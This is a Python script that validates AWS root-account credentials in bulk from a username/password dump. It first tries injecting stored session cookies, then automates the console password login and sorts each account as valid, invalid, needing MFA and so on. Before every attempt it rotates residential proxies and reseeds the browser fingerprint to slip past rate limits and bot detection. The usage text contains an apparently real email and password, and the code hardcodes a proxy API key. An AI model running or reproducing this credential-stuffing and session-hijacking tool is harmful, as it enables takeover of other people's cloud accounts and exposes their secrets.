#!/usr/bin/env python3
"""Validate AWS account credentials from a host|username|password dump, using bdg + CloakBrowser.

Input format (one per line):
    https://signin.aws.amazon.com/signin|user@example.com|password

For each account the script:
  1. Tries session-cookie injection -- if a matching cookie bundle exists under
     --cookies-dir (files with a "cookies" list of {domain,name,value} dicts),
     it injects them and checks whether the browser lands on an authenticated
     AWS console page. If yes -> status "session".
  2. Otherwise (or if the cookies don't authenticate) it performs the AWS
     root-user password login flow:
       * click "Sign in using root user email"
       * fill #resolving_input (email) -> click "Next"
       * wait for #password -> fill it -> click "Sign in"
     and classifies the result:
       * valid        -> redirected to the AWS console (authenticated)
       * invalid      -> "incorrect password" / "no account found"
       * reset_required -> account flagged for password reset
       * needs_2fa    -> MFA / verification step blocks
       * not_aws      -> page isn't the expected AWS signin form
  3. Captures bounded page HTML after each attempt (--html-dump) for later
     selector refinement.

Passwords are never echoed to stdout (only usernames / the credentials you pass).

Usage examples
--------------
    export CBPM_API_URL=https://clk.mrme.tech
    export CBPM_API_TOKEN=...          # from ~/.cbpm/config.json if unset

    # Single account
    python3 scripts/check_aws_creds.py \
        --user himanshutamarakandi@gmail.com --pass 'Vas@lala9' --profile w

    # Full dump file, with cookie injection + HTML dumps
    python3 scripts/check_aws_creds.py \
        --file /Volumes/Untitled/cookies/data/0809/aws_creds.txt \
        --cookies-dir /Volumes/Untitled/cookies/data/0809/aws \
        --profile w --delay 3 \
        --out scripts/logs/aws_results.csv \
        --html-dump scripts/logs/aws_ui_refinement
"""

from __future__ import annotations

import argparse
import glob
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.request

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DEFAULT_PROFILE = "w"
DEFAULT_TIMEOUT = 30
SETTLE_SECONDS = 6

# Failure / status markers (lowercased body text)
INCORRECT_PASSWORD = ("incorrect password", "password you entered is incorrect",
                      "invalid password", "your password is incorrect",
                      "the password you entered did not match")
ACCOUNT_NOT_FOUND = ("no account found", "account cannot be found", "does not exist",
                     "we could not find", "not registered", "no valid account",
                     "could not resolve", "user not found", "account not found")
RESET_REQUIRED = ("password reset is required", "you need to reset your password",
                  "reset your password", "password reset required")
MFA_MARKERS = ("verification code", "enter the code", "one time password", "otp",
               "authenticator", "multifactor", " mfa ", "verification is required")
BOT_MARKERS = ("captcha", "are you human", "security check", "unusual activity",
               "blocked", "robot", "try again later", "temporarily locked",
               "too many failed")
# Post-login authenticated AWS destinations.
AUTH_SUCCESS_FRAGMENTS = ("console.aws.amazon.com/console/home",
                          "console.aws.amazon.com/cloudwatch",
                          "console.aws.amazon.com/ec2",
                          "console.aws.amazon.com", "/console/home",
                          "us-east-1.console.aws.amazon.com",
                          "portal.aws.amazon.com/billing", "aws.amazon.com/console")



# ---------------------------------------------------------------------------
# Proxy rotation / fingerprint reseed / cookie loading
# ---------------------------------------------------------------------------
FLOPPY_BASE_URL = "https://api.floppydata.net"
FLOPPY_API_KEY = os.environ.get("FLOPPY_API_KEY", "1yAYInu2blMyOhSnCmwSYEET-nvAxGx8")
# Saved FloppyData rotating credential in CBM (fallback when the API is limited).
FLOPPY_CREDENTIAL_ID = "2314b312-a432-411f-a7e7-2f17414b3e56"


def fetch_floppy_proxy():
    """Return a fresh FloppyData rotating SOCKS5 connection string, or None."""
    url = f"{FLOPPY_BASE_URL}/v2/proxy/rotating/connections"
    body = json.dumps({
        "type": "residential", "country": "US", "city": "New York",
        "rotation": 15, "protocol": "socks5",
    }).encode()
    req = urllib.request.Request(
        url, data=body,
        headers={"Content-Type": "application/json", "X-Api-Key": FLOPPY_API_KEY,
                 "Accept": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return json.loads(resp.read().decode())["connection"]["connectionString"]
    except Exception as exc:
        print(f"  [proxy] FloppyData API unavailable ({exc}); using saved CBM credential",
              file=sys.stderr)
        return None


def rotate_profile(profile, use_floppy=True):
    """Assign a (rotating) proxy, reseed fingerprint, relaunch, reconnect.

    Called before each credential so every attempt gets a fresh IP + fingerprint.
    """
    if use_floppy:
        proxy = fetch_floppy_proxy()
        if proxy:
            run_bdg(["cloak", "profile", "proxy", profile, "--url", proxy], check=False)
        else:
            run_bdg(["cloak", "profile", "proxy", profile,
                     "--credential", FLOPPY_CREDENTIAL_ID], check=False)
    run_bdg(["cloak", "profile", "reseed", profile], check=False)
    run_bdg(["cloak", "stop", profile], check=False)
    time.sleep(2)
    run_bdg(["cloak", "launch", profile], check=False)
    time.sleep(4)
    run_bdg(["cloak", "connect", profile, "about:blank"], check=False)
    time.sleep(4)
# ---------------------------------------------------------------------------
# bdg helpers
# ---------------------------------------------------------------------------
def run_bdg(args, json_output=False, check=True):
    cmd = ["bdg", *args]
    if json_output:
        cmd.append("--json")
    result = subprocess.run(cmd, capture_output=True, text=True, check=check)
    if json_output:
        return json.loads(result.stdout)
    return result.stdout


def domeval(expression):
    raw = run_bdg(
        ["cdp", "Runtime.evaluate", "--params",
         json.dumps({"expression": expression, "awaitPromise": False, "returnByValue": True})],
        check=False,
    )
    try:
        return json.loads(raw)["data"]["result"]["result"]["value"]
    except Exception:
        return ""


def current_page_signals():
    expr = ("({ url: window.location.href, title: document.title, "
            "body: document.body ? document.body.innerText.trim().slice(0, 1500) : '' })")
    raw = run_bdg(
        ["cdp", "Runtime.evaluate", "--params",
         json.dumps({"expression": expr, "awaitPromise": False, "returnByValue": True})],
        check=False,
    )
    try:
        return json.loads(raw)["data"]["result"]["result"]["value"]
    except Exception:
        return {"url": "", "title": "", "body": ""}


def navigate(url, settle=SETTLE_SECONDS):
    run_bdg(["cdp", "Page.navigate", "--params", json.dumps({"url": url})], check=False)
    time.sleep(settle)


def clear_session():
    run_bdg(["cdp", "Network.clearBrowserCookies"], check=False)
    clear_storage = ("(() => { try { localStorage.clear(); } catch (e) {} "
                     "try { sessionStorage.clear(); } catch (e) {} "
                     "return 'cleared'; })()")
    run_bdg(["cdp", "Runtime.evaluate", "--params",
             json.dumps({"expression": clear_storage, "awaitPromise": False, "returnByValue": True})],
            check=False)


def fill_field(selector, value):
    sel = selector.lstrip("#")
    expr = f"""
(() => {{
  let el = document.querySelector({json.dumps(selector)});
  if (!el) el = document.querySelector('[name={json.dumps(sel)}], [id={json.dumps(sel)}]');
  if (!el) throw new Error('Element not found: ' + {json.dumps(selector)});
  const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
  el.focus();
  setter.call(el, {json.dumps(value)});
  el.dispatchEvent(new Event('input', {{ bubbles: true }}));
  el.dispatchEvent(new Event('change', {{ bubbles: true }}));
  el.blur();
  return el.value;
}})()
"""
    run_bdg(["cdp", "Runtime.evaluate", "--params",
             json.dumps({"expression": expr, "awaitPromise": False, "returnByValue": True})],
            check=False)


def click_button(text_regex):
    """Click the first visible button whose text matches text_regex. Returns True if clicked."""
    expr = f"""(() => {{
      const re = new RegExp({json.dumps(text_regex)}, "i");
      const btns = Array.from(document.querySelectorAll('button')).filter(b => {{
        const r = b.getBoundingClientRect();
        const cs = getComputedStyle(b);
        return r.width > 0 && r.height > 0 && cs.visibility !== 'hidden' && cs.display !== 'none'
               && re.test((b.textContent||'').trim());
      }});
      if (btns.length) {{ btns[0].click(); return 'clicked'; }}
      return 'none';
    }})()"""
    return domeval(expr).strip() == "clicked"


def element_visible(selector):
    """Return True if selector matches a visible (on-screen) element.

    Uses getBoundingClientRect dimensions rather than offsetParent, which is
    unreliable on AWS's signin layout.
    """
    expr = f"""(() => {{
      const e = document.querySelector({json.dumps(selector)});
      if (!e) return 'no';
      const r = e.getBoundingClientRect();
      const cs = getComputedStyle(e);
      return (r.width > 0 && r.height > 0 && cs.visibility !== 'hidden' && cs.display !== 'none') ? 'yes' : 'no';
    }})()"""
    return domeval(expr).strip() == "yes"


def wait_for_visible(selector, timeout, poll=0.8):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if element_visible(selector):
            return True
        time.sleep(poll)
    return False


def capture_html(dump_dir, username, tag):
    if not dump_dir:
        return ""
    try:
        expr = "(() => { const h = document.documentElement ? document.documentElement.outerHTML : ''; return h.slice(0, 6000); })()"
        raw = run_bdg(["dom", "eval", expr], check=False)
        if raw.startswith("(node:"):
            raw = raw[raw.find("\\n") + 1:]
        html = json.loads(raw) if raw.strip() else ""
    except Exception:
        html = ""
    if not html:
        return ""
    os.makedirs(dump_dir, exist_ok=True)
    safe_user = re.sub(r"[^A-Za-z0-9._@-]", "_", username)[:40]
    fname = f"aws__{safe_user}__{tag}.html"
    meta = {"url": domeval("location.href"), "title": domeval("document.title")}
    with open(os.path.join(dump_dir, fname), "w", encoding="utf-8") as fh:
        fh.write("<!-- captured_at=" + time.strftime("%Y-%m-%dT%H:%M:%S")
                 + " doc=" + json.dumps(meta) + " -->\n")
        fh.write(html)
    return fname

# ---------------------------------------------------------------------------
# Cookie / session helpers
# ---------------------------------------------------------------------------
def find_cookie_file(cookies_dir, username):
    """Locate a cookie bundle for `username` under cookies_dir."""
    if not cookies_dir or not os.path.isdir(cookies_dir):
        return None
    base = os.path.basename(username).lower()
    for f in sorted(glob.glob(os.path.join(cookies_dir, "*.json"))):
        fn = os.path.basename(f).lower()
        base_fn = fn[:-5]
        if base_fn.endswith("_" + base):
            try:
                d = json.load(open(f))
                if d.get("credential", {}).get("username", "").lower() == username.lower():
                    return f
            except Exception:
                continue
    return None


def load_cookies(cookies_dir, username):
    f = find_cookie_file(cookies_dir, username)
    if not f:
        return None, None
    try:
        d = json.load(open(f))
        return d.get("cookies", []), f
    except Exception:
        return None, None


def inject_cookies(cookies):
    if not cookies:
        return False
    try:
        run_bdg(["cdp", "Network.setCookies", "--params",
                 json.dumps({"cookies": cookies})], check=False)
        return True
    except Exception:
        return False


def is_authenticated(signals):
    """True only when the browser has actually landed on the signed-in console.

    We parse the current URL's scheme+host+path (ignoring query strings) so we
    never false-positive on the signin page, whose querystring / redirect_uri
    merely *mentions* console.aws.amazon.com.
    """
    url = (signals.get("url") or "")
    title = (signals.get("title") or "").lower()
    body = (signals.get("body") or "").lower()
    lower = url.lower()

    # Hard reject: we're still on a signin / oauth page.
    if re.search(r"signin\.aws\.amazon\.(com|cn)/signin", lower):
        return False
    if "/signin" in lower and "page=resolve" not in lower:
        return False
    if "sign in to access" in body or "sign in to your account" in body:
        return False

    # Extract scheme://host/path (strip query & fragment).
    m = re.match(r"https?://([^/]+)(/[^?#]*)?", url)
    if not m:
        return False
    host = m.group(1).lower()
    path = (m.group(2) or "").lower()

    # Genuine console host (regional or global) with a console home path.
    if re.search(r"(^|\.)console\.aws\.amazon\.(com|cn)$", host) and path.startswith("/console/home"):
        return True
    if host == "console.aws.amazon.com" and path.startswith("/console"):
        return True
    # Billing / account portal signed-in pages.
    if host == "portal.aws.amazon.com" and path.startswith("/billing"):
        return True
    # Signed-in console with the user menu (Sign-out) present and no login form.
    if re.search(r"(^|\.)console\.aws\.amazon\.(com|cn)$", host) and "sign out" in body:
        return True
    # Signed-in console where the title is the console (not a signin page).
    if re.search(r"(^|\.)console\.aws\.amazon\.(com|cn)$", host) and title and "sign in" not in title:
        return True
    return False


def session_check(username, cookies_dir, host_url=None):
    """Try cookie injection; return (status, detail) or (None, None) if no cookies.

    Loads the account's cookie bundle, injects it via Network.setCookies, then
    navigates to the credential's host (or the console) and checks whether the
    session holds.
    """
    cookies, src = load_cookies(cookies_dir, username)
    if cookies is None:
        return None, None
    clear_session()
    inject_cookies(cookies)
    target = host_url or "https://console.aws.amazon.com/"
    navigate(target, settle=8)
    sig = current_page_signals()
    if is_authenticated(sig):
        return "session", {"cookie_file": os.path.basename(src)}
    return "cookie_fail", {"cookie_file": os.path.basename(src)}


# ---------------------------------------------------------------------------
# AWS root-user password login
# ---------------------------------------------------------------------------
def classify_result(sig):
    url = (sig.get("url") or "").lower()
    body = (sig.get("body") or "").lower()

    if is_authenticated(sig):
        return "valid", None
    if any(m in body for m in INCORRECT_PASSWORD):
        return "invalid", "incorrect-password"
    if any(m in body for m in ACCOUNT_NOT_FOUND):
        return "invalid", "account-not-found"
    if any(m in body for m in RESET_REQUIRED):
        return "reset_required", None
    if any(m in body for m in MFA_MARKERS):
        return "needs_2fa", None
    if any(m in body for m in BOT_MARKERS):
        return "bot", "anti-bot/rate-limited"
    return "unknown", None


def start_root_signin(timeout=30):
    """Navigate to the AWS console signin and switch to root-user email mode.

    The console->signin redirect is asynchronous and the /signin page can
    occasionally return a 400 / fail to render (especially through a rotating
    proxy). We retry up to a few times, waiting for either the root-user
    resolver (#resolving_input) or the "Sign in using root user email" button.
    """
    for attempt in range(3):
        clear_session()
        navigate("https://console.aws.amazon.com/", settle=7)

        deadline = time.time() + timeout
        while time.time() < deadline:
            if element_visible("#resolving_input"):
                return True
            if click_button(r"root\s*user\s*email"):
                if wait_for_visible("#resolving_input", timeout=15):
                    return True
                # Resolver didn't render; break to retry the whole flow.
                break
            # If we're on a 400/broken page, bail early to retry sooner.
            title = (current_page_signals().get("title") or "").lower()
            if title == "bad request":
                break
            time.sleep(1.5)
        time.sleep(2)
    return False
def password_login(username, password, timeout):
    """AWS root-user password login. Returns (status, detail)."""
    if not start_root_signin(timeout=timeout):
        sig = current_page_signals()
        return "not_aws", sig.get("title", "")

    # Step 1: resolve email -> wait for password step.
    fill_field("#resolving_input", username)
    time.sleep(1)
    if not click_button(r"^next$"):
        try:
            run_bdg(["dom", "pressKey", "#resolving_input", "Enter"], check=False)
        except Exception:
            pass
    time.sleep(4)

    if not wait_for_visible("#password", timeout=timeout):
        sig = current_page_signals()
        body = (sig.get("body") or "").lower()
        if any(m in body for m in ACCOUNT_NOT_FOUND):
            return "invalid", "account-not-found"
        return "not_aws", "no password field appeared"

    fill_field("#password", password)
    time.sleep(1)
    if not click_button(r"^sign\s*in$"):
        try:
            run_bdg(["dom", "pressKey", "#password", "Enter"], check=False)
        except Exception:
            pass
    time.sleep(SETTLE_SECONDS)

    sig = current_page_signals()
    return classify_result(sig)


# ---------------------------------------------------------------------------
# Input parsing
# ---------------------------------------------------------------------------
def load_creds_file(path):
    """Load host|username|password lines."""
    rows = []
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for raw in fh:
            line = raw.rstrip("\n")
            if not line.strip():
                continue
            parts = line.split("|")
            if len(parts) >= 3:
                url, username, password = parts[0].strip(), parts[1].strip(), parts[2].strip()
                if url and username:
                    rows.append((url, username, password))
    return rows

def main():
    parser = argparse.ArgumentParser(
        description="Validate AWS account creds via CloakBrowser (cookies first, then root-user password login)"
    )
    parser.add_argument("--user", help="AWS username (root email)")
    parser.add_argument("--pass", dest="password", help="AWS password")
    parser.add_argument("--file", type=str, help="Dump file of host|username|password lines")
    parser.add_argument("--cookies-dir", default="", help="Dir with per-account cookie JSON bundles")
    parser.add_argument("--profile", default=DEFAULT_PROFILE, help="CBM profile (default: %(default)s)")
    parser.add_argument("--out", default="", help="Write results to this CSV file")
    parser.add_argument("--html-dump", default="", help="Dir to save each page HTML for refinement")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="Per-attempt timeout")
    parser.add_argument("--delay", type=float, default=3.0, help="Seconds between credentials")
    parser.add_argument("--no-cookies", action="store_true", help="Skip cookie injection entirely")
    parser.add_argument("--no-proxy-rotate", action="store_true", help="Do not rotate proxy/reseed before each credential")
    args = parser.parse_args()

    if args.user and args.password:
        creds = [("https://signin.aws.amazon.com/signin", args.user, args.password)]
    elif args.file:
        creds = load_creds_file(args.file)
    else:
        parser.error("Provide --user/--pass OR --file")

    if not creds:
        print("No credentials to check.", file=sys.stderr)
        return 1

    print(f"Checking {len(creds)} AWS account(s) via profile '{args.profile}' ...")

    try:
        run_bdg(["cloak", "connect", args.profile, "about:blank"], json_output=False, check=True)
    except subprocess.CalledProcessError as exc:
        print(f"Could not connect to profile '{args.profile}': {exc}", file=sys.stderr)
        return 1
    time.sleep(4)

    results = []
    for i, (url, username, password) in enumerate(creds, start=1):
        print(f"[{i}/{len(creds)}] {username} ...", flush=True)

        # Rotate proxy + reseed fingerprint before every credential.
        try:
            rotate_profile(args.profile, use_floppy=(not args.no_proxy_rotate))
        except Exception as exc:
            print(f"    [proxy] rotation failed: {exc}", file=sys.stderr)

        status, detail = None, None
        if not args.no_cookies and args.cookies_dir:
            status, detail = session_check(username, args.cookies_dir, url)
            if status == "session":
                capture_html(args.html_dump, username, "session")
                print(f"    -> session (cookies)")
                results.append((username, "session", "cookie-session"))
                time.sleep(args.delay)
                continue
            if status == "cookie_fail":
                print(f"    cookies present but session invalid (tokens likely expired)")

        try:
            status, detail = password_login(username, password, args.timeout)
        except Exception as exc:
            status, detail = "error", f"{type(exc).__name__}: {exc}"
        capture_html(args.html_dump, username, status)
        reason = detail or ""
        print(f"    -> {status}" + (f" ({reason})" if reason else ""))
        results.append((username, status, reason))
        time.sleep(args.delay)

    print("\n=== Summary ===")
    for username, status, reason in results:
        print(f"{status.upper():14} {username}" + (f"  ({reason})" if reason else ""))

    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write("username,status,reason\n")
            for username, status, reason in results:
                fh.write(f"{username},{status},{reason}\n")
        print(f"Results written to {args.out}")

    if args.html_dump:
        print(f"HTML snapshots saved to: {args.html_dump}")

    valid_count = sum(1 for _, s, _ in results if s in ("valid", "session"))
    print(f"\nVALID/session: {valid_count}/{len(results)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
